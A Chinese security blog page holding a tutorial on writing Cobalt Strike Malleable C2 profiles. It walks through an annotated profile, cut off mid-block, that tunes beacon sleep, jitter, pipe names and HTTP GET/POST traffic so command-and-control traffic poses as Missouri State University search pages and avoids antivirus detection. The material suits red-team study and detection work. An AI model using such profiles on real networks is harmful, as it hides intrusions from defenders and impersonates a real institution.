<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="知行合一">
<meta property="og:type" content="website">
<meta property="og:title" content="藏青&#39;s BLOG">
<meta property="og:url" content="https://cangqingzhe.github.io/index.html">
<meta property="og:site_name" content="藏青&#39;s BLOG">
<meta property="og:description" content="知行合一">
<meta property="og:locale" content="cn">
<meta property="article:author" content="藏青">
<meta property="article:tag" content="渗透 内网 代码审计">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://cangqingzhe.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false
  };
</script>

  <title>藏青's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">藏青's BLOG</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于Malleable C2的学习总结</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-09-02 10:27:15 / Modified: 18:31:04" itemprop="dateCreated datePublished" datetime="2020-09-02T10:27:15+08:00">2020-09-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        通过之前我们对于CobaltStrike的Beacon通信流程分析，我们可以看到CobaltStrike在使用心跳包发送active和match，执行命令的返回结果通过请求submit.php来进行传输，而且我们通过这两个包发送和接收的也是一些加密的内容，因此可能有些杀软可能会对这样的请求进行拦截，如果这样，那么无论我们之前对shellcode怎么免杀，只要和服务端产生一些通信，那么都有可能被拦截，因此我们需要修改掉这些流量特征，好在CobaltStrike已经给我们提供了这样的功能，那就是malleable C2。</p>
<h3 id="关于malleable-C2基本介绍"><a href="#关于malleable-C2基本介绍" class="headerlink" title="关于malleable C2基本介绍"></a>关于malleable C2基本介绍</h3><p><strong>什么是malleable C2?</strong></p>
<p>​        Beacon的HTTP的indicators由Malleable-C2-profile文件控制，关于Malleable-C2-profile，它是一个简单的配置文件，用来指定如何转换数据并将其存储在transaction中，转换和存储数据的相同配置文件也从transaction中提取和恢复。 也就是说当Beacon使用HTTP进行通信时，可以通过Malleable-C2来控制如何接收和发送指令。</p>
<p><strong>为什么要使用malleable C2?</strong></p>
<p>​        因为我们使用默认beacon通信方式可以看到存在一些特征，所以我们需要通过需改Malleable-C2来更改流量的特征，让beacon和CoblatStrike服务端的通信流量尽量来模拟正常的访问通信，要实现这个功能，可以通过编写malleable-C2-profile来实现。</p>
<h3 id="malleable-C2-profile的编写分析"><a href="#malleable-C2-profile的编写分析" class="headerlink" title="malleable C2-profile的编写分析"></a>malleable C2-profile的编写分析</h3><p><strong>如何使用malleable C2-profile文件?</strong></p>
<p>​        我以网上公开的profile为例进行分析，<a href="https://github.com/xx0hcd/Malleable-C2-Profiles" target="_blank" rel="noopener">github地址</a>,下载后normal\msu_edu.profile来进行分析</p>
<p>​        当我们启动团队服务器时，可以使用如下命令来加载Malleable-C2-profile文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver [external IP] [password] [&#x2F;path&#x2F;to&#x2F;my.profile]</span><br></pre></td></tr></table></figure>

<p>​        将normal\msu_edu.profile上传到服务器，使用上面的命令可以加载，但是在加载之前首先要测试这个profile文件的内容格式是否有问题，可以通过c2lint命令来检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;c2lint xxxx.profile</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170520452.png" alt="image-20200902170520452"></p>
<p>​        测试过程中+代表测试通过，%代表提醒的内容，！代表不通过的选项</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170554118.png" alt="image-20200902170554118"></p>
<p>​        检查通过以后，我们通过下面的命令启动teamserver并且加载 malleable-C2-profile文件 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;teamserver  ip password msu_edu.profile</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170742151.png" alt="image-20200902170742151"></p>
<p><strong>如何编写一个Malleable-C2-profile文件？</strong></p>
<p>​        打开后文件的开头如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;msu_edu.profile&quot;;  &#x2F;&#x2F;通过set给变量sample_name进行赋值</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;37500&quot;;   &#x2F;&#x2F;设置睡眠时间为37秒左右</span><br><span class="line">set jitter    &quot;33&quot;;     &#x2F;&#x2F;设置抖动率，为了防止请求时间过于规律，在这里设置抖动率为33%</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 6.1) AppleWebKit&#x2F;587.38 (KHTML, like Gecko)   Chrome&#x2F;41.0.2228.0 Safari&#x2F;537.36&quot;;  &#x2F;&#x2F;设置user-agent</span><br><span class="line"></span><br><span class="line">#set host_stage &quot;false&quot;;  &#x2F;&#x2F;如果不需要分阶段传输payload，就可以在这里将host_stage的值设置为false</span><br><span class="line"></span><br><span class="line">###DNS options###</span><br><span class="line">set dns_idle &quot;8.8.8.8&quot;;   </span><br><span class="line">set maxdns    &quot;245&quot;;  &#x2F;&#x2F;通过dns传输数据时主机名的最大长度</span><br><span class="line">set dns_sleep &quot;0&quot;; &#x2F;&#x2F;在每个dns请求之间设置延时，这里没有延时</span><br><span class="line">set dns_stager_prepend &quot;&quot;; &#x2F;&#x2F;在dns payload之前插入内容</span><br><span class="line">set dns_stager_subhost &quot;&quot;; &#x2F;&#x2F;设置dns txt record stager的子域名</span><br><span class="line">set dns_max_txt &quot;252&quot;; &#x2F;&#x2F;设置dns txt返回最大长度</span><br><span class="line">set dns_ttl &quot;1&quot;; &#x2F;&#x2F;设置DNS响应的ttl的值</span><br><span class="line"></span><br><span class="line">###SMB options###</span><br><span class="line">set pipename &quot;ntsvcs&quot;;  &#x2F;&#x2F;在使用Smb beacon来进行通信时，设置命名管道的名字</span><br><span class="line">set pipename_stager &quot;scerpc&quot;;  &#x2F;&#x2F;设置stager使用的管道名</span><br><span class="line"></span><br><span class="line">###TCP options###</span><br><span class="line">set tcp_port &quot;8000&quot;;  &#x2F;&#x2F;设置tcp_beacon监听的端口，这里设置的是8000</span><br></pre></td></tr></table></figure>

<p>​        通过上面的配置，我们实现了以37秒为基准，百分之33左右的抖动率的功能，并且使用smb beacon时，默认的命名管道名字为ntsvcs</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902171550504.png" alt="image-20200902171550504"></p>
<p>​        当使用tcp beacon时，默认的端口是8000</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902171657470.png" alt="image-20200902171657470"></p>
<p>​        并且默认的user-agent将使用我们上面配置的.</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172224238.png" alt="image-20200902172224238">    </p>
<p>​        我们继续分析，看看后面的配置文件,下面的配置文件主要用来配置证书和response header</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">###SSL Options### &#x2F;&#x2F;这个主要是给https beacon使用的配置</span><br><span class="line">#https-certificate &#123;</span><br><span class="line">    #set keystore &quot;your_store_file.store&quot;;  &#x2F;&#x2F;java kerstore文件</span><br><span class="line">    #set password &quot;your_store_pass&quot;; &#x2F;&#x2F;keystore文件的打开密码</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#https-certificate &#123;  &#x2F;&#x2F;自签名的https证书配置</span><br><span class="line">#    set C &quot;US&quot;;   &#x2F;&#x2F;国家</span><br><span class="line">#    set CN &quot;whatever.com&quot;; &#x2F;&#x2F;域名</span><br><span class="line">#    set L &quot;California&quot;; &#x2F;&#x2F;地区</span><br><span class="line">#    set O &quot;whatever LLC.&quot;;  &#x2F;&#x2F;组织名</span><br><span class="line">#    set OU &quot;local.org&quot;; &#x2F;&#x2F;组织单位名称</span><br><span class="line">#    set ST &quot;CA&quot;; &#x2F;&#x2F;州或者省</span><br><span class="line">#   set validity &quot;365&quot;; &#x2F;&#x2F;时效</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#code-signer &#123;  &#x2F;&#x2F;代码签名</span><br><span class="line">    #set keystore &quot;your_keystore.jks&quot;; &#x2F;&#x2F; java kerstore文件</span><br><span class="line">    #set password &quot;your_password&quot;;  &#x2F;&#x2F;keystore文件的打开密码</span><br><span class="line">    #set alias &quot;server&quot;;  &#x2F;&#x2F;</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">###HTTP-Config Block###  &#x2F;&#x2F;配置reponse header块</span><br><span class="line">http-config &#123;</span><br><span class="line">    #set headers &quot;Server, Content-Type&quot;;  </span><br><span class="line">    #header &quot;Content-Type&quot; &quot;text&#x2F;html;charset&#x3D;UTF-8&quot;;</span><br><span class="line">    #header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line"></span><br><span class="line">    set trust_x_forwarded_for &quot;false&quot;;  &#x2F;&#x2F;如果teamserver使用了http重定向器，就需要选择true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        下面我们来配置GET请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-GET Block###</span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;siteindex&#x2F;a&#x2F; &#x2F;siteindex&#x2F;b&#x2F; &#x2F;siteindex&#x2F;c&#x2F;&quot;;  &#x2F;&#x2F;配置请求的Uri路径</span><br><span class="line"></span><br><span class="line">    #set verb &quot;POST&quot;; &#x2F;&#x2F;用什么方法传输数据，不仅可以配置为get也可以配置为post</span><br><span class="line">    </span><br><span class="line">    client &#123;  &#x2F;&#x2F;client端的配置</span><br><span class="line"></span><br><span class="line">        header &quot;Host&quot; &quot;search.missouristate.edu&quot;;  </span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">	   </span><br><span class="line">    metadata &#123; &#x2F;&#x2F;metadata是一段加密的数据，但是没有编码，所以他不能在请求头和URI中发送。需要使用base64、base64url或者netbios编码之后才能在请求头和URI中发送。</span><br><span class="line">        #base64</span><br><span class="line">        base64url;  &#x2F;&#x2F; 使用URL-safe Base64 进行编码</span><br><span class="line">        #mask;</span><br><span class="line">        #netbios;</span><br><span class="line">        #netbiosu;</span><br><span class="line">        #prepend &quot;TEST123&quot;;  &#x2F;&#x2F;开头插入字符串</span><br><span class="line">        #append &quot;.php&quot;; &#x2F;&#x2F;末尾追加字符串</span><br><span class="line"></span><br><span class="line">        parameter &quot;filter&quot;; &#x2F;&#x2F;把数据放到名为filter的uri参数中</span><br><span class="line">        #header &quot;Cookie&quot;; &#x2F;&#x2F;把数据放到名为Cookie的http头中</span><br><span class="line">        #uri-append; &#x2F;&#x2F;把数据直接追加到URI上</span><br><span class="line"></span><br><span class="line">        #print;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #parameter &quot;test1&quot; &quot;test2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;  &#x2F;&#x2F;server端的请求配置</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;html; charset&#x3D;utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS&#x2F;8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        header &quot;Set-Cookie&quot; &quot;WWW-SERVERID&#x3D;handle; path&#x3D;&#x2F;&quot;;</span><br><span class="line"> </span><br><span class="line">        output &#123;</span><br><span class="line"></span><br><span class="line">            netbios;</span><br><span class="line">            #netbiosu;</span><br><span class="line">            #base64;</span><br><span class="line">            #base64url;</span><br><span class="line">            #mask;</span><br><span class="line">  </span><br><span class="line">            prepend &quot;    &lt;link href&#x3D;\&quot;&#x2F;resource&#x2F;styles\&quot; media&#x3D;\&quot;all\&quot; rel&#x3D;\&quot;stylesheet\&quot; &#x2F;&gt;    &lt;script src&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;scripts&#x2F;2018&#x2F;common.js?_q&#x3D;&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta name&#x3D;\&quot;robots\&quot; content&#x3D;\&quot;noindex\&quot; &#x2F;&gt;&lt;link rel&#x3D;\&quot;Stylesheet\&quot; media&#x3D;\&quot;all\&quot; href&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;styles&#x2F;msuwds&#x2F;main-sgf.css\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta name&#x3D;\&quot;vireport\&quot; content&#x3D;\&quot;width&#x3D;device-width, initial-scale&#x3D;1.0\&quot; &#x2F;&gt;\n&quot;;   </span><br><span class="line">            prepend &quot;    &lt;title&gt;A - Site Index - Missouri State University&lt;&#x2F;title&gt;\n&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta charset&#x3D;\&quot;UTF-8\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;&lt;head&gt;&quot;;     	       </span><br><span class="line">	    prepend &quot;&lt;html lang&#x3D;\&quot;en\&quot; itemscope itemtype&#x3D;\&quot;https:&#x2F;&#x2F;schema.org&#x2F;SearchResultsPage\&quot;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;&lt;!DOCTYPE html&gt;\n&quot;;</span><br><span class="line"></span><br><span class="line">	    append &quot;\&quot;&gt;&lt;&#x2F;script&gt;\n&quot;;</span><br><span class="line">            append &quot;&lt;h2&gt;About search&lt;&#x2F;h2&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;ul&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;aboutwebsearch.htm\&quot;&gt;About web search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;]n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;aboutpeoplesearch.htm\&quot;&gt;About people search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;abouteventsearch.htm\&quot;&gt;About event search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;aboutmapsearch.htm\&quot;&gt;About map search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;&quot;;</span><br><span class="line">	    append &quot;&lt;&#x2F;ul&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;&#x2F;div&gt;&quot;;</span><br><span class="line"></span><br><span class="line">            print;  &#x2F;&#x2F;以print为结束</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        通过上面的HTTP-GET块的配置，我们配置了心跳包的请求URI为/siteindex/a/，并且设置了通过filter字段来传输信息，并且返回包的内容也和我们在server部分的配置相同。这里有一个点需要注意，就是在使用prepend在返回包中添加内容时，在多个prepend字段配置中,prepend字段添加的越早，显示时越在后面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">       prepend &quot;    &lt;link href&#x3D;\&quot;&#x2F;resource&#x2F;styles\&quot; media&#x3D;\&quot;all\&quot; rel&#x3D;\&quot;stylesheet\&quot; &#x2F;&gt;    &lt;script src&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;scripts&#x2F;2018&#x2F;common.js?_q&#x3D;&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta name&#x3D;\&quot;robots\&quot; content&#x3D;\&quot;noindex\&quot; &#x2F;&gt;&lt;link rel&#x3D;\&quot;Stylesheet\&quot; media&#x3D;\&quot;all\&quot; href&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;styles&#x2F;msuwds&#x2F;main-sgf.css\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta name&#x3D;\&quot;vireport\&quot; content&#x3D;\&quot;width&#x3D;device-width, initial-scale&#x3D;1.0\&quot; &#x2F;&gt;\n&quot;;   </span><br><span class="line">       prepend &quot;    &lt;title&gt;A - Site Index - Missouri State University&lt;&#x2F;title&gt;\n&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta charset&#x3D;\&quot;UTF-8\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;&lt;head&gt;&quot;;     	       </span><br><span class="line">prepend &quot;&lt;html lang&#x3D;\&quot;en\&quot; itemscope itemtype&#x3D;\&quot;https:&#x2F;&#x2F;schema.org&#x2F;SearchResultsPage\&quot;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;&lt;!DOCTYPE html&gt;\n&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172951017.png" alt="image-20200902172951017"></p>
<p>​        我们再看一下当我们向client发送指令时的数据包,我们可以看到server端传递的请求在参数q中</p>
<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902180603819.png" alt="image-20200902180603819"></p>
<p>​        当客户端收到指令时，一般通过post来向服务端返回命令执行的结果，这部分可以通过http-post部分来配置，配置过程如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-Post Block###</span><br><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;&#x2F;getsearchresults&quot;;  &#x2F;&#x2F;配置post请求的uri</span><br><span class="line">    #set verb &quot;GET&quot;;</span><br><span class="line">    set verb &quot;POST&quot;;  &#x2F;&#x2F;配置请求的形式</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">#	header &quot;Host&quot; &quot;search.missouristate.edu&quot;;    &#x2F;&#x2F;配置请求头的信息</span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;  </span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en-US&quot;;   </span><br><span class="line">        </span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;   &#x2F;&#x2F; URL-safe Base64 编码形式输出</span><br><span class="line">	    parameter &quot;site_indexFilter&quot;;  &#x2F;&#x2F;将数据放到site_indexFilter参数中进行传输</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        id &#123; &#x2F;&#x2F;通过id标识应该输出到哪个beacon</span><br><span class="line">	    base64url;   </span><br><span class="line">	    parameter &quot;peopleFilter&quot;;  &#x2F;&#x2F;将数据放到peopleFilter参数中进行传输</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    parameter &quot;eventsFilter&quot; &quot;campus:sgf&quot;;    &#x2F;&#x2F;配置一些其他的请求参数和参数值</span><br><span class="line">#    parameter &quot;mapFilter&quot; &quot;campus&quot;;</span><br><span class="line">    parameter &quot;query&quot; &quot;my%20missouri%20state&quot;;</span><br><span class="line">    parameter &quot;resultCounts&quot; &quot;5,3,3,3&amp;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;json; charset&#x3D;utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent,AcceptEncoding&quot;;</span><br><span class="line">        header &quot;Server&quot; 